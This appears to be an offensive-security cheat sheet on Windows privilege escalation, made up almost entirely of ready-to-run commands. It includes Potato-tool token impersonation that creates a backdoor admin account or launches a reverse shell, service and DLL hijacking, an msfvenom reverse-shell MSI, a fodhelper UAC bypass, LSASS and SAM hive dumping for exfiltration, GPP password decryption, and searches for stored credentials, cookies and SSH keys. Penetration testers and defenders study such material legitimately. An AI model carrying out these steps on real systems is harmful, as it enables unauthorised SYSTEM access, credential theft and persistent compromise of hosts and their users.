---
title: "Windows Privilege Escalation"
description: "Windows privilege escalation: token impersonation, service abuse, UAC bypass, credential hunting, and registry attacks"
tags:
  - PrivEsc
  - Windows
  - SeImpersonate
  - Potato
  - UAC Bypass
---

# Windows Privilege Escalation

!!! note "What this page is doing"
    Windows escalation is usually a permissions problem: token rights, service configuration, scheduled work, registry ACLs or stored credentials. Confirm the exact build and effective access before changing a service or loading a payload.

---

## 1. Enumeration (Run These First)

```powershell
# --- Identity & privileges ---
whoami /all
whoami /priv # Look for SeImpersonate, SeDebug, SeBackup, SeRestore, SeTakeOwnership, SeLoadDriver
whoami /groups
net user <USER> /domain
net localgroup administrators
# --- System & patch level ---
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
wmic qfe list brief /format:table
wmic os get osarchitecture
# --- Network & sessions ---
ipconfig /all; route print; arp -a
netstat -ano
net session # Who else is connected
qwinsta # RDP sessions on the host
# --- Services, tasks & installed software ---
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /iv "C:\\Windows"
schtasks /query /fo LIST /v | findstr /i "TaskName\|Run As User\|Task To Run"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName, DisplayVersion
dir "C:\Program Files" "C:\Program Files (x86)"
# --- Automated collectors ---
.\winPEASx64.exe quiet cmd fast
.\Seatbelt.exe -group=all
.\PrivescCheck.ps1 -Extended
# Also: PowerUp.ps1 (Invoke-AllChecks), SharpUp, BeRoot, Watson, JAWS
```

---

## 2. Token Impersonation: The Potato Family

If you have `SeImpersonatePrivilege` (common for IIS, MSSQL, and service accounts) → **SYSTEM in one command**.

| Tool | Works On | Notes |
| :--- | :--- | :--- |
| **GodPotato** | Windows Server 2012–2022, Win 8–11 | Most reliable modern option |
| **SigmaPotato** | Modern Windows | Includes juicy-potato + GodPotato logic + .NET variants |
| **SweetPotato** | Wide range | Multi-technique wrapper |
| **RoguePotato / JuicyPotato / PrintSpoofer** | Older Windows (pre-2019 for some) | Fallbacks when GodPotato fails |
| **SharpEfsPotato** | EFSRPC coercion | Useful when other COM/print spoofing is patched |
| **DCOMPotato / EfsPotato** | Various | More coercion primitives |

```powershell
# --- GodPotato: SeImpersonate -> SYSTEM ---
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add"
.\GodPotato.exe -cmd "cmd /c powershell -enc <BASE64_REVERSE_SHELL>"
.\GodPotato.exe -cmd "cmd /c C:\Temp\beacon.exe" # Run a C2 payload as SYSTEM
# --- PrintSpoofer / RoguePotato (older targets) ---
.\PrintSpoofer.exe -i -c cmd
.\RoguePotato.exe -r <LHOST> -e "cmd /c whoami" -l 9999
# --- JuicyPotato (Windows Server 2016/2019 legacy) ---
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c "{CLSID}"
# Get a CLSID list: https://ohpe.it/juicy-potato/CLSID/
```

```text
# Privilege-to-impact map. This is reference text, not executable input.
SeImpersonatePrivilege  -> token impersonation / service-to-SYSTEM paths
SeAssignPrimaryToken    -> token duplication paths
SeDebugPrivilege        -> inspect or inject into protected processes
SeBackupPrivilege       -> read protected files and registry hives
SeRestorePrivilege      -> write protected paths or replace a DLL
SeTakeOwnershipPrivilege -> take ownership before changing permissions
SeLoadDriverPrivilege   -> load a driver; review kernel-risk and policy first
SeManageVolumePrivilege -> create or overwrite files through volume operations
SeTcbPrivilege          -> act as part of the operating system
```

---

## 3. Service & Task Misconfigurations

=== " Unquoted Service Path"

    ```powershell
    # Find unquoted service paths with spaces + a writable directory in the chain
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /iv "C:\\Windows"
    # Example vulnerable path:
    # C:\Program Files\Vuln App\Service\app.exe (no quotes!)
    # Windows tries, in order:
    # C:\Program.exe
    # C:\Program Files\Vuln.exe
    # C:\Program Files\Vuln App\Service.exe <- CREATE THIS
    # Then restart the service:
    sc stop <SVC> && sc start <SVC>
    # (Or wait for a reboot.)
    ```

=== " Weak Service Binary / Directory Permissions"

    ```powershell
    # Find services whose binary YOU can overwrite
    .\accesschk.exe /accepteula -uwcqv "Everyone" * # Service permissions
    .\accesschk.exe /accepteula -uwdq "C:\Program Files\Vuln" # Directory permissions
    # Overwrite the binary with a payload then restart the service
    copy C:\Temp\payload.exe "C:\Program Files\Vuln\service.exe" /Y
    sc stop <SVC> && sc start <SVC>
    # --- Service configuration abuse (if you can modify the service) ---
    sc config <SVC> binPath= "C:\Temp\payload.exe"
    sc config <SVC> obj= ".\LocalSystem" password= ""
    sc stop <SVC> && sc start <SVC>
    # PowerShell:
    Get-Service <SVC> | Set-Service -BinPath "C:\Temp\payload.exe"
    # --- Weak service registry ACL (change ImagePath) ---
    .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<SVC>
    reg add HKLM\System\CurrentControlSet\Services\<SVC> /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\payload.exe /f
    ```

=== "⏰ Scheduled Task & DLL Hijack Abuse"

    ```powershell
    # --- Writable script or binary run by a SYSTEM scheduled task ---
    schtasks /query /fo LIST /v | findstr /i "Task To Run"
    .\accesschk.exe /accepteula -uwcqv "SYSTEM" "C:\Scripts\backup.bat"
    # --- DLL hijacking / search-order hijacking ---
    # 1. Find a service that loads a missing DLL (Process Monitor is the classic tool)
    # 2. Check writable dirs earlier in the DLL search order
    # 3. Drop a malicious DLL with the same name + an exported function
    # --- Automated discovery ---
    .\SioSploit.exe # or use msfvenom + a DLL template
    ```

---

## 4. Registry & Configuration Attacks

```powershell
# --- AlwaysInstallElevated (MSI runs as SYSTEM) ---
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both = 0x1 -> exploit:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o pwn.msi
msiexec /quiet /qn /i C:\Temp\pwn.msi
# --- AutoLogon credentials in the registry ---
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
# --- Stored credentials hunting ---
cmdkey /list
# If a credential exists, run a payload as that user:
runas /savecred /user:<DOMAIN>\<USER> "cmd /c C:\Temp\payload.exe"
# --- Unattend / sysprep / config files with cleartext or base64 passwords ---
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\System32\sysprep\sysprep.xml
type C:\unattend.xml
# Search the whole disk for them:
Get-ChildItem `
  -Path C:\ `
  -Include unattend.xml,unattend.txt,sysprep.inf,*.config,web.config,*.log `
  -Recurse -ErrorAction SilentlyContinue
# --- Group Policy Preferences (cPassword) ---
findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\Policies\*.xml
# Decrypt the AES key (Microsoft published it):
gpp-decrypt "<CPASSWORD_BASE64>" # -> cleartext password
```

---

## 5. UAC Bypass (Medium -> High Integrity)

| Technique | Requires | Notes |
| :--- | :--- | :--- |
| **`fodhelper.exe` (ms-settings hijack)** | Medium IL | Registry `HKCU:\Software\Classes\ms-settings\Shell\Open\command` |
| **`computerdefaults.exe`** | Medium IL | Same `ms-settings` hijack pattern |
| **`sdclt.exe` / `eventvwr.exe`** | Medium IL | Registry hijack of an auto-elevated binary's path |
| **`DiskCleanup` / `SilentCleanup` task** | Medium IL | `%windir%\system32\cleanmgr.exe /autoclean` env hijack |
| **`WSReset.exe` / `cmstp.exe` / `slui.exe`** | Medium IL | Various LOLBin auto-elevation paths |
| **`schtasks /RU SYSTEM`** (if allowed) | Medium IL | Direct SYSTEM task creation |
| **`Runas` + savedcred** | Stored creds | `runas /savecred` |
| **`UACMe` (Akagi)** | Medium IL | 80+ curated bypass methods — the reference toolkit |

```powershell
# --- fodhelper.exe UAC bypass (the classic) ---
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe /c C:\Temp\payload.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
# Then CLEAN UP:
reg delete "HKCU\Software\Classes\ms-settings" /f
# --- Automated (UACMe / Akagi) ---
.\Akagi64.exe 23 C:\Temp\payload.exe # Method 23 = fodhelper
.\Akagi64.exe -l # List all available methods
```

---

## 6. Credential Hunting & LSASS

```powershell
# --- LSASS dump (requires SeDebugPrivilege / admin) ---
# 1. Task Manager: right-click lsass.exe -> Create dump file
# 2. ProcDump (Sysinternals):
.\procdump64.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
# 3. comsvcs.dll LOLBin (no tool download needed!):
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
# 4. Parse offline from Linux:
pypykatz lsa minidump lsass.dmp
# 5. Windows-side parsing:
# mimikatz # sekurlsa::minidump lsass.dmp
# mimikatz # sekurlsa::logonpasswords
# --- Registry hive extraction (offline SAM/LSA secrets) ---
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
# Exfil and parse:
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# --- SeBackupPrivilege: copy hives via robocopy (bypasses file locks) ---
robocopy /b C:\Windows\System32\config C:\Temp SAM SYSTEM SECURITY
# Parse offline with the same command as above.
# --- Other credential locations on Windows hosts ---
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
dir /s /b C:\Users\*\*.kdbx # KeePass databases -> crack with keepass2john
dir /s /b C:\Users\*\Cookies # Browser cookies (session hijack)
type C:\Windows\win.ini
Get-ChildItem "C:\Users" -Recurse -Include id_rsa,id_ed25519,*.pem,*.ppk -ErrorAction SilentlyContinue
# DPAPI: decrypt Chrome/Edge passwords, RDP creds, Wi-Fi keys, Credential Guard vaults
# SharpDPAPI.exe machinetriage (requires SYSTEM/admin)
# .\SharpDPAPI.exe credentials /unprotect
```

---

## 7. Advanced Windows Escalation

```text
- ADCS on the local host : Machine certificate + PetitPotam -> DC takeover (see AD section)
- Token impersonation : Invoke-TokenManipulation / incognito (find SYSTEM tokens)
- Print Spooler (SpoolSample) -> coercion to attacker host with unconstrained delegation
- Writable PATH (system) : Place payload.exe in a system PATH dir -> runs as SYSTEM on next login
- Weak ACL on a SYSTEM process binary (ProcMon: "CreateFile" + "ACCESS DENIED" hunting)
- HiveNightmare / SeriousSAM (CVE-2021-36934): readable SAM via Volume Shadow Copy
- PrintNightmare (CVE-2021-34527): instant SYSTEM when Point and Print is misconfigured
- CVE-2024-30088 / CVE-2023-36802 / similar modern kernel LPEs — verify patch level first
- Hyper-V / WSL escapes, driver-based attacks (BYOVD) — validate in lab before use:
    - Vulnerable signed drivers (e.g. from the LOLDrivers project) -> DSE bypass -> kernel pwn
    - Requires SeLoadDriverPrivilege or admin; check "wwahost" and EDR driver protection
```

!!! tip "Order of Preference (Highest Reliability First)"
    1. **Stored credentials** (unattend.xml, registry, cmdkey, browser, history)
    2. **SeImpersonatePrivilege** → GodPotato → SYSTEM
    3. **Service misconfigurations** (unquoted path, writable binary, weak ACL)
    4. **Weak registry permissions** (ImagePath / AlwaysInstallElevated)
    5. **UAC bypass** (if you need High IL with admin group membership)
    6. **Kernel / driver exploit** — last resort, always verify the build number